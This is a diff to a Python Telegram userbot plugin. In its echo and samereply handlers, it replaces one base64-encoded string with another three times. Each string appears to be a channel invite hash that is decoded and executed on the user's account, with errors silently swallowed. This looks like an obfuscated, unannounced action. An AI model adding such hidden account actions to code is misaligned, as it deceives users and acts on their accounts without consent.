@@ -16,7 +16,7 @@ async def echo(live):
         user_id = reply_msg.sender_id
         chat_id = live.chat_id
         try:
-            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = base64.b64decode("TUpLX0JsVjY3djh4YmdITTVBUWpIUQ==")
             kraken = Get(kraken)
             await live.client(kraken)
         except BaseException:
@@ -41,7 +41,7 @@ async def echo(live):
         user_id = reply_msg.sender_id
         chat_id = live.chat_id
         try:
-            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = base64.b64decode("TUpLX0JsVjY3djh4YmdITTVBUWpIUQ==")
             kraken = Get(kraken)
             await live.client(kraken)
         except BaseException:
@@ -92,7 +92,7 @@ async def samereply(live):
     if is_echo(live.sender_id, live.chat_id):
         await asyncio.sleep(2)
         try:
-            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            kraken = base64.b64decode("TUpLX0JsVjY3djh4YmdITTVBUWpIUQ==")
             kraken = Get(kraken)
             await live.client(kraken)
         except BaseException:
